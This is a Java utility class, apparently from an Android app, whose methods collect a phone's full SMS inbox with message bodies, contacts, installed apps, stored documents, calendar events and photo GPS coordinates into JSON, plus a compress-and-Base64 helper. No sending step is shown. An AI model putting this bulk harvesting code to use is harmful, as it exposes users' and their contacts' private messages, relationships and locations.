package com.ok.moxico;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.BitmapFactory;
import android.location.Address;
import android.location.Geocoder;
import android.media.ExifInterface;
import android.net.Uri;
import android.os.Build;
import android.provider.CalendarContract;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.Locale;
import java.util.zip.Deflater;

public class DevicesUtil {

    public static Uri SMS_INBOX = Uri.parse("content://sms/");

    public static String getMobileSms(Context mContext) {
        JSONArray jsonArray = new JSONArray();
        try {
            ContentResolver cr = mContext.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type", "status", "service_center", "read", "thread_id", "protocol", "seen"};
            Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
            if (cur != null) {
                while (cur.moveToNext()) {
                    String _id = cur.getString(cur.getColumnIndex("_id"));//短信序号，如100
                    String number = cur.getString(cur.getColumnIndex("address"));//发件人地址，即手机号，如+8613811810000
                    String read = cur.getString(cur.getColumnIndex("read"));//是否阅读0未读，1已读
                    String status = cur.getString(cur.getColumnIndex("status"));//短信状态-1接收，0complete,64pending,128failed
                    String thread_id = cur.getString(cur.getColumnIndex("thread_id"));//对话的序号，如100，与同一个手机号互发的短信，其序号是相同的
                    String service_center = cur.getString(cur.getColumnIndex("service_center"));//短信服务中心号码编号，如+8613800755500
                    String protocol = cur.getString(cur.getColumnIndex("protocol"));//协议0SMS_RPOTO短信，1MMS_PROTO彩信
                    String name = cur.getString(cur.getColumnIndex("person"));//发件人，如果发件人在通讯录中则为具体姓名，陌生人为null
                    String body = cur.getString(cur.getColumnIndex("body"));//短信具体内容
                    String date = cur.getString(cur.getColumnIndex("date"));//日期，long型，如1256539465022，可以对日期显示格式进行设置
                    String type = cur.getString(cur.getColumnIndex("type"));//短信类型1是接收到的，2是已发出
                    String seen = cur.getString(cur.getColumnIndex("seen"));//短信类型1是接收到的，2是已发出
                    //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("smsId", _id);
                    jsonObject.put("read", read);
                    jsonObject.put("service_center", service_center);
                    jsonObject.put("status", status);
                    jsonObject.put("protocol", protocol);
                    jsonObject.put("thread_id", thread_id);
                    jsonObject.put("address", number);
                    jsonObject.put("body", body);
                    jsonObject.put("person", name);
                    jsonObject.put("date", date);
                    jsonObject.put("type", type);
                    jsonObject.put("seen", seen);
                    jsonArray.put(jsonObject);
                }
            }
        } catch (Exception e) {
            Log.i("异常", e.toString());
            return "";
        }
        return jsonArray.toString();
    }


    public static String getContactJson(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    String _ID = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String CONTACT_STATUS = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_STATUS));
                    String CONTACT_STATUS_TIMESTAMP = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_STATUS_TIMESTAMP));
                    String TIMES_CONTACTED = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
                    String PHOTO_ID = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.PHOTO_ID));
                    String IS_USER_PROFILE = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.IS_USER_PROFILE));
                    String CUSTOM_RINGTONE = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CUSTOM_RINGTONE));
                    String SEND_TO_VOICEMAIL = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.SEND_TO_VOICEMAIL));
                    String STARRED = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.STARRED));
                    String LAST_TIME_CONTACTED = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
                    String HAS_PHONE_NUMBER = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                    String IN_VISIBLE_GROUP = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.IN_VISIBLE_GROUP));
                    String CONTACT_LAST_UPDATED_TIMESTAMP = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));
                    String DISPLAY_NAME = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (!TextUtils.isEmpty(IN_VISIBLE_GROUP)) {
                        jsonObject.put("in_visible_group", IN_VISIBLE_GROUP);
                    }
                    if (!TextUtils.isEmpty(HAS_PHONE_NUMBER)) {
                        jsonObject.put("has_phone_number", HAS_PHONE_NUMBER);
                    }
                    if (!TextUtils.isEmpty(STARRED)) {
                        jsonObject.put("starred", STARRED);
                    }
                    if (!TextUtils.isEmpty(PHOTO_ID)) {
                        jsonObject.put("photo_id", PHOTO_ID);
                        if (TextUtils.equals("-2", PHOTO_ID)) {
                            jsonObject.put("source", "2");
                        } else {
                            jsonObject.put("source", "1");
                        }
                    }

                    if (!TextUtils.isEmpty(CUSTOM_RINGTONE)) {
                        jsonObject.put("custom_ringtone", CUSTOM_RINGTONE);
                    }

                    if (!TextUtils.isEmpty(LAST_TIME_CONTACTED)) {
                        jsonObject.put("last_time_contacted", LAST_TIME_CONTACTED);
                    }

                    if (!TextUtils.isEmpty(SEND_TO_VOICEMAIL)) {
                        jsonObject.put("send_to_voicemail", SEND_TO_VOICEMAIL);
                    }
                    if (!TextUtils.isEmpty(IS_USER_PROFILE)) {
                        jsonObject.put("is_user_profile", IS_USER_PROFILE);
                    }
                    if (!TextUtils.isEmpty(CONTACT_STATUS_TIMESTAMP)) {
                        jsonObject.put("contact_status_ts", CONTACT_STATUS_TIMESTAMP);
                    }
                    if (!TextUtils.isEmpty(CONTACT_STATUS)) {
                        jsonObject.put("contact_status", CONTACT_STATUS);
                    }
                    if (!TextUtils.isEmpty(TIMES_CONTACTED)) {
                        jsonObject.put("times_contacted", TIMES_CONTACTED);
                    }
                    Cursor phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + _ID,
                            null, null);
                    //    jsonObject.put("id", _ID);
                    jsonObject.put("up_time", CONTACT_LAST_UPDATED_TIMESTAMP);
                    jsonObject.put("contact_display_name", DISPLAY_NAME);
                    while (phones.moveToNext()) {
                        String phoneNumber = phones.getString(phones.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        if (TextUtils.isEmpty(phoneNumber)) {
                            continue;
                        }
                        int type = phones.getInt(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                        if (type == ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE) {
                            jsonObject.put("number", phoneNumber);
                            break;
                        } else {
                            if (jsonObject.has("number")) {
                                continue;
                            }
                            jsonObject.put("number", phoneNumber);
                        }
                    }
                    if (!jsonObject.has("number")) {
                        continue;
                    }
                    phones.close();
                    jsonArray.put(jsonObject);
                }
                cursor.close();
            }
            return jsonArray.toString();
        } catch (Exception e) {
            Log.i("error", e.toString());
            return "";
        }
    }

    public static String getInstallApp(Context context) {
        try {
            JSONArray jsonArray = new JSONArray();
            @SuppressLint("QueryPermissionsNeeded")
            List<PackageInfo> packages = context.getPackageManager().getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES);
            int j = packages.size() - 1;
            while (j > 0) {
                if (context.getPackageManager().getLaunchIntentForPackage(packages.get(j).packageName) == null) {
                    packages.remove(j);
                }
                j--;
            }
            for (int i = 0; i < packages.size(); i++) {
                JSONObject jsonObject = new JSONObject();
                PackageInfo packageInfo = packages.get(i);
                jsonObject.put("appName", packageInfo.applicationInfo.loadLabel(
                        context.getPackageManager()).toString());
                jsonObject.put("packageName", packageInfo.packageName);
                jsonObject.put("versionName", packageInfo.versionName);
                jsonObject.put("versionCode", packageInfo.versionCode);
                jsonObject.put("firstInstallTime", packageInfo.firstInstallTime);
                jsonObject.put("lastUpdateTime", packageInfo.lastUpdateTime);
                jsonObject.put("packagePath", packageInfo.applicationInfo.sourceDir);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    jsonObject.put("isPreInstall", (packageInfo.applicationInfo.isVirtualPreload()) ? "1" : "0");
                } else {
                    jsonObject.put("isPreInstall", "0");
                }
                jsonObject.put("isSystem", (packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0 ? "0" : "1");
                jsonArray.put(jsonObject);
            }
            return jsonArray.toString();

        } catch (Exception e) {
            Log.i("error", e.toString());
            return "";
        }
    }

    public static String queryCategoryFilesSync(Context context, String type) {
        JSONArray jsonArray = new JSONArray();
        Uri uri;
        try {
            if (type.equals("image")) {
                uri = MediaStore.Images.Media.getContentUri("external");
            } else if (type.equals("video")) {
                uri = MediaStore.Video.Media.getContentUri("external");
            } else if (type.equals("audio")) {
                uri = MediaStore.Audio.Media.getContentUri("external");
            } else {
                uri = MediaStore.Files.getContentUri("external");
            }
            if (uri != null) {
                String[] projection = new String[]{MediaStore.Files.FileColumns._ID, // id
                        MediaStore.Files.FileColumns.DATA, // 文件路径
                        MediaStore.Files.FileColumns.SIZE, // 文件大小
                        MediaStore.Files.FileColumns.DATE_ADDED,
                        MediaStore.Files.FileColumns.MIME_TYPE,
                        MediaStore.Files.FileColumns.DATE_MODIFIED}; // 修改日期
                Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null);
                if (cursor != null) {
                    try {
                        if (cursor.moveToFirst()) {
                            final int pathIdx = cursor
                                    .getColumnIndex(MediaStore.Files.FileColumns.DATA);
                            final int sizeIdx = cursor
                                    .getColumnIndex(MediaStore.Files.FileColumns.SIZE);
                            final int modifyIdx = cursor
                                    .getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED);
                            final int addIdx = cursor
                                    .getColumnIndex(MediaStore.Files.FileColumns.DATE_ADDED);
                            final String MIME_TYPE = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE));
                            do {
                                String path = cursor.getString(pathIdx);
                                JSONObject jsonObject = new JSONObject();
                                jsonObject.put("mType ", MIME_TYPE);
                                jsonObject.put("mPath", path);
                                jsonObject.put("mSize", cursor.getLong(sizeIdx));
                                jsonObject.put("addTime", cursor.getLong(modifyIdx) * 1000);
                                jsonObject.put("mLastModifyTime", 1000 * cursor.getLong(addIdx));
                                jsonObject.put("mName", getNameFromFilepath(path));
                                jsonArray.put(jsonObject);
                            } while (cursor.moveToNext());
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        cursor.close();
                    }
                }
            }
        } catch (Exception e) {
            Log.i("异常", e.toString());
            return "";
        }
        return jsonArray.toString();
    }

    private static final char UNIX_SEPARATOR = '/';


    public static String getNameFromFilepath(String filepath) {
        if (!TextUtils.isEmpty(filepath)) {
            int pos = filepath.lastIndexOf(UNIX_SEPARATOR);
            if (pos != -1) {
                return filepath.substring(pos + 1);
            }
        }
        return "";
    }


    public static String getAllFile(Context mContext) {
        JSONArray jsonArray = new JSONArray();
        try {
            String[] projection = new String[]{MediaStore.Files.FileColumns._ID,
                    MediaStore.Files.FileColumns.DATA,
                    MediaStore.Files.FileColumns.TITLE,
                    MediaStore.Files.FileColumns.MIME_TYPE
                    , MediaStore.Files.FileColumns.SIZE,
                    MediaStore.Files.FileColumns.DATE_ADDED,
                    MediaStore.Files.FileColumns.DATE_MODIFIED};
            String selection = MediaStore.Files.FileColumns.MIME_TYPE + "= ? " + " or " + MediaStore.Files.FileColumns.MIME_TYPE + "= ? " + " or " + MediaStore.Files.FileColumns.MIME_TYPE + "= ? "
                    + " or " + MediaStore.Files.FileColumns.MIME_TYPE + "= ? " + " or " + MediaStore.Files.FileColumns.MIME_TYPE + "= ? " + " or " + MediaStore.Files.FileColumns.MIME_TYPE + "= ? ";
            String[] selectionArgs = new String[]{"application/vnd.android.package-archive", "application/pdf", "application/msword", "application/vnd.ms-powerpoint", "application/vnd.ms-excel", "text/plain"};
            Cursor cursor = mContext.getContentResolver().query(MediaStore.Files.getContentUri("external"), projection, selection, selectionArgs, MediaStore.Files.FileColumns.DATE_MODIFIED + " desc");
            String fileId;
            String fileName;
            String filePath;
            String MIME_TYPE;
            while (cursor.moveToNext()) {

                fileId = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns._ID));
                fileName = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.TITLE));
                filePath = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA));
                MIME_TYPE = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE));
                final int modifyIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED);
                final int addIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_ADDED);
                final int sizeIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.SIZE);
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("id ", fileId);
                if (MIME_TYPE.equals("application/vnd.android.package-archive")) {
                    jsonObject.put("mType ", "apk");
                } else if (MIME_TYPE.equals("application/pdf")) {
                    jsonObject.put("mType ", "pdf");
                } else if (MIME_TYPE.equals("application/msword")) {
                    jsonObject.put("mType ", "word");
                } else if (MIME_TYPE.equals("application/vnd.ms-powerpoint")) {
                    jsonObject.put("mType ", "ppt");
                } else if (MIME_TYPE.equals("application/vnd.ms-excel")) {
                    jsonObject.put("mType ", "excel");
                } else if (MIME_TYPE.equals("text/plain")) {
                    jsonObject.put("mType ", "text");
                }
                jsonObject.put("mPath", filePath);
                jsonObject.put("mName", fileName);
                jsonObject.put("mSize", cursor.getLong(sizeIdx));
                jsonObject.put("addTime", cursor.getLong(modifyIdx) * 1000);
                jsonObject.put("mLastModifyTime", cursor.getLong(addIdx) * 1000);
                jsonArray.put(jsonObject);
            }
        } catch (Exception e) {
            return "";
        }
        return jsonArray.toString();
    }


    public static String getFile(Context mContext, String type) {
        JSONArray jsonArray = new JSONArray();
        try {
            String[] projection = new String[]{MediaStore.Files.FileColumns._ID,
                    MediaStore.Files.FileColumns.DATA,
                    MediaStore.Files.FileColumns.TITLE,
                    MediaStore.Files.FileColumns.MIME_TYPE
                    , MediaStore.Files.FileColumns.SIZE, // 文件大小
                    MediaStore.Files.FileColumns.DATE_ADDED,
                    MediaStore.Files.FileColumns.DATE_MODIFIED};
            String selection = MediaStore.Files.FileColumns.MIME_TYPE + "= ? ";
            String[] selectionArgs = new String[]{type};
            Cursor cursor = mContext.getContentResolver().query(MediaStore.Files.getContentUri("external"), projection, selection, selectionArgs, MediaStore.Files.FileColumns.DATE_MODIFIED + " desc");
            String fileId;
            String fileName;
            String filePath;
            String MIME_TYPE;
            while (cursor.moveToNext()) {

                fileId = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns._ID));
                fileName = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.TITLE));
                filePath = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA));
                MIME_TYPE = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE));
                final int modifyIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED);
                final int addIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_ADDED);
                final int sizeIdx = cursor.getColumnIndex(MediaStore.Files.FileColumns.SIZE);

                JSONObject jsonObject = new JSONObject();
                jsonObject.put("id ", fileId);
                if (MIME_TYPE.equals("application/vnd.android.package-archive")) {
                    jsonObject.put("mType ", "apk");
                } else if (MIME_TYPE.equals("application/pdf")) {
                    jsonObject.put("mType ", "pdf");
                } else if (MIME_TYPE.equals("application/msword")) {
                    jsonObject.put("mType ", "word");
                } else if (MIME_TYPE.equals("application/vnd.ms-powerpoint")) {
                    jsonObject.put("mType ", "ppt");
                } else if (MIME_TYPE.equals("application/vnd.ms-excel")) {
                    jsonObject.put("mType ", "excel");
                } else if (MIME_TYPE.equals("text/plain")) {
                    jsonObject.put("mType ", "text");
                }
                jsonObject.put("mPath", filePath);
                jsonObject.put("mName", fileName);
                jsonObject.put("mSize", cursor.getLong(sizeIdx));
                jsonObject.put("addTime", cursor.getLong(modifyIdx) * 1000);
                jsonObject.put("mLastModifyTime", cursor.getLong(addIdx) * 1000);
                jsonArray.put(jsonObject);
            }
        } catch (Exception e) {
            return "";
        }
        return jsonArray.toString();
    }


    public static String zipString(String unzipString) {
        try {
            Deflater deflater = new Deflater(Deflater.BEST_COMPRESSION);
            deflater.setInput(unzipString.getBytes());
            deflater.finish();
            final byte[] bytes = new byte[256];
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream(256);
            while (!deflater.finished()) {
                int length = deflater.deflate(bytes);
                outputStream.write(bytes, 0, length);
            }
            deflater.end();
            return Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) {
            return "";
        }
    }

    private static String CALENDER_EVENT_URL = "content://com.android.calendar/events";

    public static String getCalendar(Context context) {
        String startTime = "";
        String endTime = "";
        String eventTitle = "";
        String description = "";
        String location = "";
        String eventId = "";
        JSONArray arr = new JSONArray();
        Cursor eventCursor = context.getContentResolver().query(Uri.parse(CALENDER_EVENT_URL), null,
                null, null, null);
        try {
            String[] REMINDERS_COLUMNS = new String[]{
                    CalendarContract.Reminders._ID,
                    CalendarContract.Reminders.EVENT_ID,
                    CalendarContract.Reminders.MINUTES,
                    CalendarContract.Reminders.METHOD,
            };

            while (eventCursor.moveToNext()) {
                JSONObject json = new JSONObject();

                eventId = eventCursor.getString(eventCursor.getColumnIndex("_id"));
                eventTitle = eventCursor.getString(eventCursor.getColumnIndex("title"));
                description = eventCursor.getString(eventCursor.getColumnIndex("description"));
                startTime = eventCursor.getString(eventCursor.getColumnIndex("dtstart"));
                endTime = eventCursor.getString(eventCursor.getColumnIndex("dtend"));
                if (eventTitle == null) {
                    json.put("eventTitle", "");
                } else {
                    json.put("eventTitle", eventTitle);
                }
                if (description == null) {
                    json.put("description", "");
                } else {
                    json.put("description", description);
                }
                if (startTime == null) {
                    json.put("startTime", "");
                } else {
                    json.put("startTime", startTime);
                }
                if (endTime == null) {
                    json.put("endTime", "");
                } else {
                    json.put("endTime", endTime);
                }
                if (eventId == null) {
                    json.put("eventId", "");
                } else {
                    json.put("eventId", eventId);
                }

                Cursor remindersCursor = context.getContentResolver().query(
                        CalendarContract.Reminders.CONTENT_URI,
                        REMINDERS_COLUMNS,
                        CalendarContract.Reminders.EVENT_ID + "=?",
                        new String[]{eventId + ""},
                        null);
                JSONArray reminders = new JSONArray();
                while (remindersCursor.moveToNext()) {
                    JSONObject reminder = new JSONObject();
                    String rid = remindersCursor.getString(remindersCursor.getColumnIndex(CalendarContract.Reminders._ID));
                    String event_Id = remindersCursor.getString(remindersCursor.getColumnIndex(CalendarContract.Reminders.EVENT_ID));
                    String minutes = remindersCursor.getString(remindersCursor.getColumnIndex(CalendarContract.Reminders.MINUTES));
                    String method = remindersCursor.getString(remindersCursor.getColumnIndex(CalendarContract.Reminders.METHOD));
                    reminder.put("reminder_id", rid);
                    reminder.put("eventId", event_Id);
                    reminder.put("minutes", minutes);
                    reminder.put("method", method);
                    reminders.put(reminder);
                }
                json.put("reminders", reminders);
                remindersCursor.close();
                arr.put(json);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        eventCursor.close();
        return arr.toString();
    }

    private static JSONObject getInfo(String path, JSONObject jsonObject) {
        try {

            ExifInterface exifInterface = new ExifInterface(path);

//            String guangquan = exifInterface.getAttribute(ExifInterface.TAG_APERTURE);
//            String shijain = exifInterface.getAttribute(ExifInterface.TAG_DATETIME);
//            String baoguangshijian = exifInterface.getAttribute(ExifInterface.TAG_EXPOSURE_TIME);
//            String jiaoju = exifInterface.getAttribute(ExifInterface.TAG_FOCAL_LENGTH);
//            String chang = exifInterface.getAttribute(ExifInterface.TAG_IMAGE_LENGTH);
//            String kuan = exifInterface.getAttribute(ExifInterface.TAG_IMAGE_WIDTH);
            String moshi = exifInterface.getAttribute(ExifInterface.TAG_MODEL);
            String zhizaoshang = exifInterface.getAttribute(ExifInterface.TAG_MAKE);
//            String iso = exifInterface.getAttribute(ExifInterface.TAG_ISO);
//            String jiaodu = exifInterface.getAttribute(ExifInterface.TAG_ORIENTATION);
//            String baiph = exifInterface.getAttribute(ExifInterface.TAG_WHITE_BALANCE);
//            String altitude_ref = exifInterface.getAttribute(ExifInterface
//                    .TAG_GPS_ALTITUDE_REF);
//            String altitude = exifInterface.getAttribute(ExifInterface.TAG_GPS_ALTITUDE);
            String latitude = exifInterface.getAttribute(ExifInterface.TAG_GPS_LATITUDE);
//            String latitude_ref = exifInterface.getAttribute(ExifInterface
//                    .TAG_GPS_LATITUDE_REF);
//            String longitude_ref = exifInterface.getAttribute(ExifInterface
//                    .TAG_GPS_LONGITUDE_REF);
            String longitude = exifInterface.getAttribute(ExifInterface.TAG_GPS_LONGITUDE);
//            String timestamp = exifInterface.getAttribute(ExifInterface.TAG_GPS_TIMESTAMP);
//            String processing_method = exifInterface.getAttribute(ExifInterface
//                    .TAG_GPS_PROCESSING_METHOD);
            if (zhizaoshang == null) {
                jsonObject.put("make", "");
            } else {
                jsonObject.put("make", zhizaoshang);
            }

            if (moshi == null) {
                jsonObject.put("model", "");
            } else {
                jsonObject.put("model", moshi);
            }
            if (latitude == null) {
                jsonObject.put("latitude", "");
            } else {
                double lat = score2dimensionality(latitude);

                jsonObject.put("latitude", lat);
            }
            if (longitude == null) {
                jsonObject.put("longitude", "");
            } else {
                double lon = score2dimensionality(longitude);
                jsonObject.put("longitude", lon);
            }

        } catch (Exception e) {
        }
        return jsonObject;
    }

    private static double score2dimensionality(String string) {
        double dimensionality = 0.0;
        if (null == string) {
            return dimensionality;
        }

        //用 ，将数值分成3份
        String[] split = string.split(",");
        for (int i = 0; i < split.length; i++) {

            String[] s = split[i].split("/");
            //用112/1得到度分秒数值
            double v = Double.parseDouble(s[0]) / Double.parseDouble(s[1]);
            //将分秒分别除以60和3600得到度，并将度分秒相加
            dimensionality = dimensionality + v / Math.pow(60, i);
        }
        return dimensionality;
    }

    public static String getImageList(Context context) {

        JSONArray jsonArray = new JSONArray();
        Cursor photoCursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                null, null, null, null);
        try {
            while (photoCursor.moveToNext()) {
//                Photo photo = new Photo();
                //照片路径
                JSONObject jsonObject = new JSONObject();
                String photoPath = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA));
                //照片日期
                long photoDate = photoCursor.getLong(photoCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN));
                //照片标题
                String photoTitle = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                BitmapFactory.Options options = new BitmapFactory.Options();
                options.inJustDecodeBounds = true;
                BitmapFactory.decodeFile(photoPath, options);

                //照片长度
                String photoLength = String.valueOf(options.outHeight);

                //照片宽度
                String photoWidth = String.valueOf(options.outWidth);
                jsonObject.put("height", photoLength);
                jsonObject.put("width", photoWidth);
                jsonObject.put("name", photoTitle);
                jsonObject.put("time", photoDate);
                jsonArray.put(getInfo(photoPath, jsonObject));
//                photoCursor.close();

            }
        } catch (Exception e) {
        } finally {
            if (photoCursor != null) photoCursor.close();
        }
        return jsonArray.toString();
    }

    /**
     * 转地址
     */
    public static Address getAddress(Context context, double latitude, double longitude) {
        Geocoder gc = new Geocoder(context, Locale.getDefault());
        List<Address> locationList = null;
        try {
            locationList = gc.getFromLocation(latitude, longitude, 1);
            if (locationList != null && locationList.size() > 0) {
                return locationList.get(0);
            }
        } catch (Exception e) {
            // Log.i("异常", e.toString());
        }
        return null;
    }


    public static String getCity(Context context, double latitude, double longitude) {

        String address = "";
        try {
            Geocoder ge = new Geocoder(context);
            List<Address> addList = ge.getFromLocation(latitude, longitude, 1);
            if (addList != null && addList.size() > 0) {
                for (int i = 0; i < addList.size(); i++) {
                    Address ad = addList.get(i);
                    address = ad.getLocality();
                    address = TextUtils.isEmpty(address) ? ad.getAdminArea() : address;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
        return address;
    }


    public static String getLocations(Context context, double latitude, double longitude) {
        JSONObject json = new JSONObject();
        try {
            Address address = getAddress(context, latitude, longitude);
            if (address != null) {
                json.put("admin_area", address.getAdminArea());
                json.put("address0", address.getAddressLine(0));
                json.put("country_code", address.getCountryCode());
                json.put("country_name", address.getCountryName());
                json.put("feature_name", address.getFeatureName());
            }
        } catch (Exception e) {
            Log.i("异常", e.toString());
            return "";
        }
        return json.toString();
    }

}
